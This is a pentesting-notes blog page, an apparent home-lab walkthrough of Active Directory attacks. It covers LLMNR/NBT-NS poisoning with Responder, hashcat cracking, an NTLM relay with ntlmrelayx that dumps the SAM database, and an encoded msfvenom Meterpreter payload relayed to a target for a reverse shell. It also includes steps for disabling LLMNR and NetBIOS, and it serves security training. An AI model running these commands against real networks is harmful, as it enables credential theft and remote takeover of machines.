<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Leveraging Network-Based Trust in AD | 0x-s0M3n4th's Blog</title><meta name=keywords content="Active Directory,Trust Abuse,Red Team"><meta name=description content="Abusing inter-domain and network-based trust relationships for privilege escalation."><meta name=author content="0x-s0M3n4th"><link rel=canonical href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/10-active-directory-attacks/03-leveraging-network-based-trust/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=https://0x-s0M3n4th.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0x-s0M3n4th.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0x-s0M3n4th.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://0x-s0M3n4th.github.io/apple-touch-icon.png><link rel=mask-icon href=https://0x-s0M3n4th.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/10-active-directory-attacks/03-leveraging-network-based-trust/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/10-active-directory-attacks/03-leveraging-network-based-trust/"><meta property="og:site_name" content="0x-s0M3n4th's Blog"><meta property="og:title" content="Leveraging Network-Based Trust in AD"><meta property="og:description" content="Abusing inter-domain and network-based trust relationships for privilege escalation."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="notes"><meta property="article:published_time" content="2025-11-24T13:25:00+05:30"><meta property="article:modified_time" content="2025-11-24T13:25:00+05:30"><meta property="article:tag" content="Active Directory"><meta property="article:tag" content="Trust Abuse"><meta property="article:tag" content="Red Team"><meta property="og:image" content="https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Leveraging Network-Based Trust in AD"><meta name=twitter:description content="Abusing inter-domain and network-based trust relationships for privilege escalation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Notes","item":"https://0x-s0M3n4th.github.io/notes/"},{"@type":"ListItem","position":2,"name":"Network Penetration Testing","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/"},{"@type":"ListItem","position":4,"name":"Active Directory Attacks","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/10-active-directory-attacks/"},{"@type":"ListItem","position":5,"name":"Leveraging Network-Based Trust in AD","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/10-active-directory-attacks/03-leveraging-network-based-trust/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Leveraging Network-Based Trust in AD","name":"Leveraging Network-Based Trust in AD","description":"Abusing inter-domain and network-based trust relationships for privilege escalation.","keywords":["Active Directory","Trust Abuse","Red Team"],"articleBody":"While this section focuses on exploiting the trust of the Active Directory roles and services within a Windows environment, there are several types of attacks, such as pass-the-hash, that exploit the security vulnerabilities found within the protocols of the Transmission Control Protocol/Internet Protocol (TCP/IP) protocol suite. When we talk about TCP/IP, we are often referring to network-related technologies and devices. However, the protocols within TCP/IP can be found in the operating system and the applications running on a host device as well.\nExploiting LLMNR and NetBios-NS: In many orgs, we will find that they are using windows server as their Domain Controller(ADDS role installed) . Additionally, Active Directory allows IT professionals to use GPOs to assign privileges to end devices and users, thereby creating restrictions to prevent unauthorized activities and actions from occurring in the domain.\nNote When using the Active Directory Domain Service role, by default, it uses LDAP, which is an unsecure directory access protocol.\nWithin a Windows environment, you will commonly find both the Network Basic Input/Output System-Name Service (NetBIOS-NS) and Link-Local Multicast Name Resolution (LLMNR) protocols. NetBIOS-NS is a network protocol and is commonly used on Local Area Networks (LANs) to resolve the hostnames of other devices within the same network. However, NetBIOS has been around for a very long time, and it is considered to be very outdated. While it is now a legacy protocol, it can still be found on many organizations’ internal networks. In modern enterprise networks, with Windows operating systems as clients and servers, you will find that LLMNR is enabled by default where there are no Domain Name System (DNS) servers present or available on the network. LLMNR shares similarities to its predecessor, NetBIOS-NS, as they are both used to resolve hostnames on a network. While in many medium-sized to large corporate networks, there may be one or more internal DNS servers, LLMNR is still enabled by default on Windows operating systems. Both protocols can be exploited for attacks like spoofing and poisoning. Attackers can respond to LLMNR/NetBIOS-NS queries with false information, potentially redirecting traffic to malicious hosts.\nWe will use a tool called Responder to listen for LLMNR, NBT-NS, and DNS messages on a network and will reply to any systems sending these types in the order listed. Responder simply allows Kali Linux to capture these messages and provide a fake response to clients on the network.\nPractical: Fire up kali linux and determine in which interface THEPUNISHER and WINDOWS SERVER 2022 is . In my case it’s on 10.11.12.0/24 Run responder using the following command: sudo responder -I eth1 -dPv COMMAND BREAKDOWN:\n-I : specifying the interface to listen and send malicious responses. -d: Enables NetBIOS replies for domain suffix queries on the network. -P / --Proxyauth : Forces NTLM/Basic authentication for the proxy. WPAD/-w option doesn’t need to be on. -v : verbose mode. Then open your windows server , press win + R and type out the ip address of your kali machine like this: \\\\kali_ip / you can write anything after the \\\\ like this \\\\fileserver , Windows will not find the file share and send a broadcast message on the network that will be eventually captured by responder . Giving this \\\\kali_ip is called UNC(Universal Name Convention) . Also you will prompted to give your user’s credential , provide that also {thanks to -P option}. The moment you will provide the credentials responder will capture the NTLMV1/V2 hash of the password. Save the hash inside a file: Then use hashcat to determine number of NTLM V2 cracking and crack it, follow the steps: we need this one NTLMV2 . Use the following hashcat command for cracking: hashcat -m 5600 hash_file.txt /usr/share/wordlists/rockyou.txt -O 7. To see the cracked password separately use the following command:\nhashcat -m 5600 fcastle_hash.txt /usr/share/wordlists/rockyou.txt --show Important The Windows operating system stores local users’ passwords in the form of NTLM hashes, either NTLMv1 or NTLMv2, depending on the version of Microsoft Windows and its configurations. However, when Windows needs to send these passwords across a network, it uses NTLMv2 and not NTLMv1. Keep in mind that you can perform pass-the-hash techniques using both NTLMv1 and NTLMv2 password hashes on a network. While NTLMv2 is considered more secure, threat actors can still exploit it to perform NTLM Relay and password-cracking attacks to gain unauthorized access to systems on networks.\nNote In a real-world penetration test or red teaming exercise, you will need a dedicated password-cracking system with a dedicated Graphics Processing Unit (GPU) and Hashcat on the host operating system. This enables Hashcat to fully leverage the GPU for offline password cracking. GPUs are highly efficient at performing the types of parallel computations necessary for password cracking, significantly reducing the time required to crack passwords compared to using a CPU alone. This efficiency is due to the architecture of GPUs, which can perform thousands of simple calculations simultaneously.\nHow to Secure Networks against LLMNR / NBT-NS Poisoning Attacks Disable NetBIOS Name Service There appears to be no way to disable NetBIOS Name Service using a GPO, manual instructions are below.\nOpen: Control Panel\\Network and Internet\\Network Connections Right click on the network interface, select properties, double click on “Internet Protocol Version 4 TCP/IPv4“ On the next screen, click advanced, then select the WINS tab Click the radio button next to “Disable NetBIOS over TCP/IP“ Disable LLMNR Start =\u003e Run =\u003e gpedit.msc Open “Local Computer Policy” =\u003e “Computer Configuration” =\u003e “Administrative Templates” =\u003e “Network” =\u003e “DNS Client“ Click on “Turn Off Multicast Name Resolution” and set it to “Enabled Exploiting SMB and NTLMV2 within AD: The Server Message Block (SMB) protocol is a common network protocol that lets devices share resources like files and printers across a network. Within an enterprise network, you will often discover there are many shared network drives mapped to employees’ computers. This allows users to share files across the entire organization easily.\nRetrieving the SAM database: To start, we’ll exploit the trust between Windows hosts on a network and retrieve the contents of the SAM database of a host with SMB. By retrieving the contents of the SAM database, you’ll have access to the usernames and the NTLM hashes of each local user account. You can perform offline password cracking to identify the plaintext passwords for each user or perform pass-the-hash to access other systems on the network that use shared user credentials.\nPower on kali , THEPUNISHER, THESPIDERMAN, Winserver 2022 Run the following NSE command to check for SMB version 2 message signing enabled or not, if enabled then it's required or not : nmap --script smb2-security-mode -p 445 10.11.12.0/24 3. As shown in the screenshot Message signing is not required in THEPUNISHER machine. 4. Next, we will need to use Responder once more. However, this time, we do not want Responder to respond to any SMB and HTTP messages that are sent from clients on the network – only listen for them. Use the following command to open responder.conf file to do some basic changes :\nsudo vim /etc/responder/responder.conf 5. After that run responder as we did earlier: 6. Next, we will be using Impacket to perform an NTLM relay attack by capturing the domain user credentials from THESPIDERMAN and relaying them to THEPUNISHER. This will allow us to capture the user accounts within the SAM database on THEPUNISHER . But there is a catch : there should be a common local user/Domain user/local admin in those 2 devices, then only we can use the captured local admin's hash from THESPIDERMAN to THEPUNISHER , which will help us to dump the SAM file hashes. 7. Use the following command to set the target as THEPUNISHER machine:\nimpacket-ntlmrelayx -t 172.30.1.128 -smb2support # i have put the ip of THEPUNISHER machine 8. NTLM relay attacks are possible when a user account is shared between systems on a network, such as a local user account and even domain users.\nImportant When using the Impacket ntlmrelayx.py script, using the -t syntax allows you to specify a single target. However, in a large organization, you will want to create a text file containing a list of IP addresses for all the host systems that have their SMB security mode set to Message signing enabled and required. This file can be invoked using the -tf command for simplicity during a penetration test.\nIn a real penetration test engagement, you will need to wait for a user to trigger an event on the network. However, within our lab, there are no other users to perform such events. So login to THESPIDERMAN machine as a local user/local admin, i am having a common password between the local admins of both the devices so i will use that account. Once you are logged in, press win + R and type in kali's Ip address just like we did earlier. Now at this moment the SAM dump has been performed and you can see the results in your ntlmrelayx tab: Add the hashes into a file. Use the following command for cleanup the data to get the NTLMV1 hashes: cut -d \":\" -f 4 file_name.txt COMMAND BRIEF:\n-d: This syntax specifies the delimiter with quotation marks. For instance, -d “:” specifies to locate the colon (:) character within the samdump.txt file. -f: This syntax specifies the field to retrieve between the delimiter. For instance, -f 4 specifies to retrieve the fourth section which are the hashes. Cracking the hash: Finding the number for NTLM V1 : hashcat -h | grep NTLM 3. Cracking the hash using the following command:\nhashcat -m 1000 sam_dump_NTLMV1_THEPUNISHER.txt /usr/share/wordlists/rockyou.txt 4. These are the 2 passwords we have cracked till now: Obtaining a reverse shell: We’ll be creating a malicious payload using MSFvenom to gain a reverse shell and using Metasploit to create a listener for capturing the return connection from the victim. Additionally, we’ll be using both Responder and Impacket to capture the responses and perform an NTLM relay attack on the target.\nOpen your Kali, THEPUNISHER, THESPIDERMAN machine. On kali, open msfconsole and start the multihandler with the following commands: sudo msfconsole msf \u003e use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf exploit(multi/handler) \u003e set payload windows/meterpreter/reverse_tcp payload =\u003e windows/meterpreter/reverse_tcp msf exploit(multi/handler) \u003e set AutoRunScript post/windows/manage/migrate AutoRunScript =\u003e post/windows/manage/migrate msf exploit(multi/handler) \u003e set LHOST 172.30.1.130 LHOST =\u003e 172.30.1.130 msf exploit(multi/handler) \u003e set LPORT 1234 LPORT =\u003e 1234 msf exploit(multi/handler) \u003e exploit Make sure you have allowed incoming connections on that LPORT. Now we will make a payload using msfvenom and encode it using shikata_ga_nai with 9 iterations: msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.30.1.130 LPORT=1234 -f exe -o PUNISHER.exe -e x86/shikata_ga_nai -i 9 Make sure you have given proper LHOST, LPORT according to the multihandler. 5. Start responder on the correct Network adapter\n6. Now we will use ntlmrelayx to relay the local admin’s hashes collected from the SPIDERMAN machine and relay it to the PUNISHER machine along with the payload execution, which will give us back a reverse connection:\nimpacket-ntlmrelayx -t 172.30.1.128 -smb2support -e PUNISHER.exe Perform the network trigger by accessing a file share on SPIDERMAN machine. 7. ntlmrelayx will do it’s job by creating a service , executing the payload: 8. At this point we should get back a reverse connection on multihandler: EXTRA READING: Security Account Manager: https://www.techtarget.com/searchenterprisedesktop/definition/Security-Accounts-Manager Active Directory Domain Services overview: https://www.techtarget.com/searchenterprisedesktop/definition/Security-Accounts-Manager PowerView command list: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon BloodHound documentation: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon LLMNR/NBT-NS poisoning and SMB relay: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon ","wordCount":"1895","inLanguage":"en","image":"https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-11-24T13:25:00+05:30","dateModified":"2025-11-24T13:25:00+05:30","author":{"@type":"Person","name":"0x-s0M3n4th"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/10-active-directory-attacks/03-leveraging-network-based-trust/"},"publisher":{"@type":"Organization","name":"0x-s0M3n4th's Blog","logo":{"@type":"ImageObject","url":"https://0x-s0M3n4th.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://0x-s0M3n4th.github.io/ accesskey=h title="0x-s0M3n4th's Blog (Alt + H)"><img src=https://0x-s0M3n4th.github.io/apple-touch-icon.png alt aria-label=logo height=35>0x-s0M3n4th's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://0x-s0M3n4th.github.io/archive/ title=Archives><span>Archives</span></a></li><li><a href=https://0x-s0M3n4th.github.io/table-of-contents/ title="Table of contents"><span>Table of contents</span></a></li><li><a href=https://0x-s0M3n4th.github.io/blogs/ title=Blogs><span>Blogs</span></a></li><li><a href=https://0x-s0M3n4th.github.io/notes/ title=Notes><span>Notes</span></a></li><li><a href=https://0x-s0M3n4th.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://0x-s0M3n4th.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://0x-s0M3n4th.github.io/resume.pdf title=Resume><span>Resume</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0x-s0M3n4th.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/>Notes</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/>Network Penetration Testing</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/10-active-directory-attacks/>Active Directory Attacks</a></div><h1 class="post-title entry-hint-parent">Leveraging Network-Based Trust in AD</h1><div class=post-description>Abusing inter-domain and network-based trust relationships for privilege escalation.</div><div class=post-meta><span title='2025-11-24 13:25:00 +0530 IST'>November 24, 2025</span>&nbsp;·&nbsp;<span>9 min</span>&nbsp;·&nbsp;<span>1895 words</span>&nbsp;·&nbsp;<span>0x-s0M3n4th</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#exploiting-llmnr-and-netbios-ns>Exploiting LLMNR and NetBios-NS:</a><ul><li><a href=#practical>Practical:</a></li></ul></li><li><a href=#how-to-secure-networks-against-llmnr--nbt-ns-poisoning-attacks>How to Secure Networks against LLMNR / NBT-NS Poisoning Attacks</a><ul><li><a href=#disable-netbios-name-service>Disable NetBIOS Name Service</a></li><li><a href=#disable-llmnr>Disable LLMNR</a></li></ul></li><li><a href=#exploiting-smb-and-ntlmv2-within-ad>Exploiting SMB and NTLMV2 within AD:</a><ul><li><a href=#retrieving-the-sam-database>Retrieving the SAM database:</a></li></ul></li><li><a href=#cracking-the-hash>Cracking the hash:</a></li><li><a href=#obtaining-a-reverse-shell>Obtaining a reverse shell:</a></li><li><a href=#extra-reading>EXTRA READING:</a></li></ul></nav></div></details></div><div class=post-content><p>While this section focuses on exploiting the trust of the Active Directory roles and services within a Windows environment, there are several types of attacks, such as pass-the-hash, that exploit the security vulnerabilities found within the protocols of the Transmission Control Protocol/Internet Protocol (TCP/IP) protocol suite. When we talk about TCP/IP, we are often referring to network-related technologies and devices. However, the protocols within TCP/IP can be found in the operating system and the applications running on a host device as well.</p><hr><h2 id=exploiting-llmnr-and-netbios-ns>Exploiting LLMNR and NetBios-NS:<a hidden class=anchor aria-hidden=true href=#exploiting-llmnr-and-netbios-ns>#</a></h2><p>In many orgs, we will find that they are using windows server as their Domain Controller(ADDS role installed) . Additionally, Active Directory allows IT professionals to use GPOs to assign privileges to end devices and users, thereby creating restrictions to prevent unauthorized activities and actions from occurring in the domain.</p><link rel=stylesheet href=/css/vendors/admonitions.4fd9a0b8ec8899f2ca952048d255a569f433f77dfb3f52f5bc87e7d65cdce449.css integrity="sha256-T9mguOyImfLKlSBI0lWlafQz9337P1L1vIfn1lzc5Ek=" crossorigin=anonymous><div class="admonition note"><div class=admonition-header><svg viewBox="0 0 576 512"><path d="M0 64C0 28.7 28.7.0 64 0H224v128c0 17.7 14.3 32 32 32h128v125.7l-86.8 86.8c-10.3 10.3-17.5 23.1-21 37.2l-18.7 74.9c-2.3 9.2-1.8 18.8 1.3 27.5L64 512c-35.3.0-64-28.7-64-64V64zm384 64H256V0L384 128zM549.8 235.7l14.4 14.4c15.6 15.6 15.6 40.9.0 56.6l-29.4 29.4-71-71 29.4-29.4c15.6-15.6 40.9-15.6 56.6.0zM311.9 417 441.1 287.8l71 71L382.9 487.9c-4.1 4.1-9.2 7-14.9 8.4l-60.1 15c-5.5 1.4-11.2-.2-15.2-4.2s-5.6-9.7-4.2-15.2l15-60.1c1.4-5.6 4.3-10.8 8.4-14.9z"/></svg>
<span>Note</span></div><div class=admonition-content><p>When using the Active Directory Domain Service role, by default, it uses <code>LDAP</code>, which is an unsecure directory access protocol.</p></div></div><p>Within a Windows environment, you will commonly find both the <code>Network Basic Input/Output System-Name Service (NetBIOS-NS)</code> and <code>Link-Local Multicast Name Resolution (LLMNR)</code> protocols.
<code>NetBIOS-NS is a network protocol and is commonly used on Local Area Networks (LANs) to resolve the hostnames of other devices within the same network</code>. However, NetBIOS has been around for a very long time, and it is considered to be very outdated. While it is now a legacy protocol, it can still be found on many organizations’ internal networks.
In modern enterprise networks, with Windows operating systems as clients and servers, you will find that LLMNR is enabled by default where there are no Domain Name System (DNS) servers present or available on the network. LLMNR shares similarities to its predecessor, NetBIOS-NS, as they are both used to resolve hostnames on a network. While in many medium-sized to large corporate networks, there may be one or more internal DNS servers, LLMNR is still enabled by default on Windows operating systems. Both protocols can be exploited for attacks like spoofing and poisoning. Attackers can respond to LLMNR/NetBIOS-NS queries with false information, potentially redirecting traffic to malicious hosts.</p><p><em>We will use a tool called Responder to listen for LLMNR, NBT-NS, and DNS messages on a network and will reply to any systems sending these types in the order listed. Responder simply allows Kali Linux to capture these messages and provide a fake response to clients on the network.</em></p><hr><h3 id=practical>Practical:<a hidden class=anchor aria-hidden=true href=#practical>#</a></h3><ol><li>Fire up kali linux and determine in which interface <code>THEPUNISHER</code> and <code>WINDOWS SERVER 2022</code> is . In my case it&rsquo;s on <code>10.11.12.0/24</code></li><li>Run <code>responder</code> using the following command:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo responder -I eth1 -dPv
</span></span></code></pre></div><p><img alt=nbt_1 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_1.png>
COMMAND BREAKDOWN:</p><ul><li><code>-I</code> : specifying the interface to listen and send malicious responses.</li><li><code>-d</code>: Enables NetBIOS replies for domain suffix queries on the network.</li><li><code>-P / --Proxyauth</code> : Forces NTLM/Basic authentication for the proxy. WPAD/-w option doesn&rsquo;t need to be on.</li><li><code>-v</code> : verbose mode.</li></ul><ol start=3><li>Then open your <code>windows server</code> , press <code>win + R</code> and type out the ip address of your kali machine like this: <code>\\kali_ip</code> / you can write anything after the <code>\\</code> like this <code>\\fileserver</code> , Windows will not find the file share and send a broadcast message on the network that will be eventually captured by <code>responder</code> . Giving this <code>\\kali_ip</code> is called <strong>UNC(Universal Name Convention)</strong> . Also you will prompted to give your user&rsquo;s credential , provide that also {thanks to -P option}.
<img alt=nbt_2 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_2.png>
<img alt=nbt_3 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_3.png></li><li>The moment you will provide the credentials <code>responder</code> will capture the NTLMV1/V2 hash of the password.
<img alt=nbt_4 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_4.png></li><li>Save the hash inside a file:
<img alt=nbt_5 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_5.png></li><li>Then use hashcat to determine number of <code>NTLM V2</code> cracking and crack it, follow the steps:
<img alt=nbt_6 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_6.png>
we need this one <code>NTLMV2</code> .
Use the following <code>hashcat</code> command for cracking:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>5600</span> hash_file.txt /usr/share/wordlists/rockyou.txt -O
</span></span></code></pre></div><p><img alt=nbt_7 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_7.png>
<img alt=nbt_8 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_8.png>
7. To see the cracked password separately use the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>5600</span> fcastle_hash.txt /usr/share/wordlists/rockyou.txt --show
</span></span></code></pre></div><p><img alt=nbt_9 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_9.png></p><div class="admonition important"><div class=admonition-header><svg viewBox="0 0 512 512"><path d="M256 512A256 256 0 10256 0a256 256 0 100 512zm0-384c13.3.0 24 10.7 24 24v112c0 13.3-10.7 24-24 24s-24-10.7-24-24V152c0-13.3 10.7-24 24-24zM224 352a32 32 0 1164 0 32 32 0 11-64 0z"/></svg>
<span>Important</span></div><div class=admonition-content><p>The Windows operating system stores local users’ passwords in the form of NTLM hashes, either NTLMv1 or NTLMv2, depending on the version of Microsoft Windows and its configurations. However, when Windows needs to send these passwords across a network, it uses NTLMv2 and not NTLMv1. Keep in mind that you can perform pass-the-hash techniques using both NTLMv1 and NTLMv2 password hashes on a network. While NTLMv2 is considered more secure, threat actors can still exploit it to perform NTLM Relay and password-cracking attacks to gain unauthorized access to systems on networks.</p></div></div><div class="admonition note"><div class=admonition-header><svg viewBox="0 0 576 512"><path d="M0 64C0 28.7 28.7.0 64 0H224v128c0 17.7 14.3 32 32 32h128v125.7l-86.8 86.8c-10.3 10.3-17.5 23.1-21 37.2l-18.7 74.9c-2.3 9.2-1.8 18.8 1.3 27.5L64 512c-35.3.0-64-28.7-64-64V64zm384 64H256V0L384 128zM549.8 235.7l14.4 14.4c15.6 15.6 15.6 40.9.0 56.6l-29.4 29.4-71-71 29.4-29.4c15.6-15.6 40.9-15.6 56.6.0zM311.9 417 441.1 287.8l71 71L382.9 487.9c-4.1 4.1-9.2 7-14.9 8.4l-60.1 15c-5.5 1.4-11.2-.2-15.2-4.2s-5.6-9.7-4.2-15.2l15-60.1c1.4-5.6 4.3-10.8 8.4-14.9z"/></svg>
<span>Note</span></div><div class=admonition-content><p>In a real-world penetration test or red teaming exercise, you will need a dedicated password-cracking system with a dedicated Graphics Processing Unit (GPU) and Hashcat on the host operating system. This enables Hashcat to fully leverage the GPU for offline password cracking. GPUs are highly efficient at performing the types of parallel computations necessary for password cracking, significantly reducing the time required to crack passwords compared to using a CPU alone. This efficiency is due to the architecture of GPUs, which can perform thousands of simple calculations simultaneously.</p></div></div><h2 id=how-to-secure-networks-against-llmnr--nbt-ns-poisoning-attacks>How to Secure Networks against LLMNR / NBT-NS Poisoning Attacks<a hidden class=anchor aria-hidden=true href=#how-to-secure-networks-against-llmnr--nbt-ns-poisoning-attacks>#</a></h2><h3 id=disable-netbios-name-service>Disable NetBIOS Name Service<a hidden class=anchor aria-hidden=true href=#disable-netbios-name-service>#</a></h3><p>There appears to be no way to disable NetBIOS Name Service using a GPO, manual instructions are below.</p><ol><li>Open: Control Panel\Network and Internet\Network Connections</li><li>Right click on the network interface, select properties, double click on “Internet Protocol Version 4 TCP/IPv4“</li><li>On the next screen, click advanced, then select the WINS tab</li><li>Click the radio button next to “Disable NetBIOS over TCP/IP“</li></ol><h3 id=disable-llmnr>Disable LLMNR<a hidden class=anchor aria-hidden=true href=#disable-llmnr>#</a></h3><ol><li>Start => Run => gpedit.msc Open “Local Computer Policy” => “Computer Configuration” => “Administrative Templates” => “Network” => “DNS Client“</li><li>Click on “Turn Off Multicast Name Resolution” and set it to “Enabled</li></ol><hr><h2 id=exploiting-smb-and-ntlmv2-within-ad>Exploiting SMB and NTLMV2 within AD:<a hidden class=anchor aria-hidden=true href=#exploiting-smb-and-ntlmv2-within-ad>#</a></h2><p><code>The Server Message Block (SMB)</code> protocol is a common network protocol that lets devices share resources like files and printers across a network. Within an enterprise network, you will often discover there are many shared network drives mapped to employees’ computers. This allows users to share files across the entire organization easily.</p><h3 id=retrieving-the-sam-database>Retrieving the SAM database:<a hidden class=anchor aria-hidden=true href=#retrieving-the-sam-database>#</a></h3><p>To start, we’ll exploit the trust between Windows hosts on a network and retrieve the contents of the SAM database of a host with SMB. By retrieving the contents of the SAM database, you’ll have access to the usernames and the NTLM hashes of each local user account. You can perform offline password cracking to identify the plaintext passwords for each user or perform pass-the-hash to access other systems on the network that use shared user credentials.</p><ol><li>Power on <code>kali , THEPUNISHER, THESPIDERMAN, Winserver 2022</code></li><li>Run the following <code>NSE</code> command to check for <code>SMB version 2 message signing enabled or not, if enabled then it's required or not</code> :</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap --script smb2-security-mode -p <span class=m>445</span> 10.11.12.0/24
</span></span></code></pre></div><p><img alt=nbt_10 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_10.png>
<img alt=nbt_11 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_11.png>
3. As shown in the screenshot <code>Message signing is not required in THEPUNISHER</code> machine.
4. Next, we will need to use Responder once more. However, this time, we do not want Responder to respond to any SMB and HTTP messages that are sent from clients on the network – only listen for them. Use the following command to open <code>responder.conf</code> file to do some basic changes :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo vim /etc/responder/responder.conf
</span></span></code></pre></div><p><img alt=nbt_12 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_12.png>
<img alt=nbt_13 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_13.png>
5. After that run <code>responder</code> as we did earlier:
<img alt=nbt_14 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_14.png>
6. Next, we will be using <code>Impacket</code> to perform an <code>NTLM relay attack</code> by capturing the domain user credentials from <code>THESPIDERMAN</code> and relaying them to <code>THEPUNISHER</code>. This will allow us to capture the user accounts within the SAM database on <code>THEPUNISHER</code> . But there is a catch : there should be a common <code>local user/Domain user/local admin</code> in those 2 devices, then only we can use the captured <code>local admin's hash</code> from <code>THESPIDERMAN</code> to <code>THEPUNISHER</code> , which will help us to dump the <code>SAM</code> file hashes.
7. Use the following command to set the target as <code>THEPUNISHER</code> machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-ntlmrelayx -t 172.30.1.128 -smb2support
</span></span><span class=line><span class=cl><span class=c1># i have put the ip of THEPUNISHER machine</span>
</span></span></code></pre></div><p><img alt=nbt_15 loading=lazy src=/images/Pentesting/NP/AD/03/nbt_15.png>
